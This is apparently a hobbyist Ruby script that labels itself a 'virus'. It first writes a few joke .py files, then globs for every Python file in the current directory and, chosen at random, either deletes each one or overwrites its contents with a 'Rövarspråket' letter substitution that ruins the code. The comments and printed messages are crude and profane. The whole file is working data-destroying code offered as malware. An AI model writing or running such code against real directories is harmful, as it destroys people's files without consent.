#Initializes a virus
def start
  puts "We are definitely not Fu**ing up your python files... or are we?"
  file_search
end

#Checks the folder for python files
def file_search
  py_files = Dir.glob('*.py')
  if py_files != []
    destiny(py_files)
  else
    puts "You got lucky, Motherasshole!"
  end
end

#Goes through a list and decides if the currently selected file gets deleted or converted to "Rövarspråket"
def destiny(list)
  list.each do |x|
    jesus = god
      File.delete(x) if jesus == 1
      ass_schmacker(x) if jesus == 2
  end
end

#Generates a number between 1-2
def god
  return rand(1..2)
end

#Converts the contents of the file to "Rövarspråk"
def ass_schmacker(file)
  text = File.read(file)
  replace = text.gsub!(/([bcdfghjklmnpqrstvwxzBCDFGHJKLMNPQRSTVWXZ])/, '\1o\1')
  File.open(file, "w") {|z| z.puts replace}
end

#This creates some python files to mess with...
File.open('test.py', 'w') do |f2|
  f2.puts "Wälkommen til main snoppfenstoppfen"
  end

  File.open('test1.py', 'w') do |f2|
    f2.puts "Jag är en dvärg och jag gräver ett hål, gråver ett hål, gräver gräver hål"
  end
    File.open('test3.py', 'w') do |f2|
      f2.puts "Jag är dan bull och jag sparkar på ett flöde, sparkar på ett flöde, sparkar ett flöööööde"
    end
      File.open('tes4t.py', 'w') do |f2|
        f2.puts "Who was rapping, dovahkiin dragons are not dovahkiin"
      end

#Initializes the initialisation of the virus
start